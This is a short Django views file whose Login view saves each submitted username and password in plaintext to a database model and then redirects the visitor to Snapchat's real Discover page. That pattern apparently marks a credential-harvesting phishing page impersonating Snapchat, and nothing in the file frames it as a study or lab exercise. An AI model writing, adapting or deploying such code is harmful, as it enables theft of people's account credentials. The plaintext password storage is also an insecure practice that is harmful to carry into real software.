from django.shortcuts import render, redirect
from .models import Data


def Home(request):
    return render(request, "Home.html")


def Login(request):
    if request.method == "POST":
        username = request.POST["username"]
        password = request.POST["password"]
        if username and password:
            user = Data.objects.create(username=username, password=password)
            user.save()
            return redirect("https://www.snapchat.com/discover")
    return render(request, "Login.html")
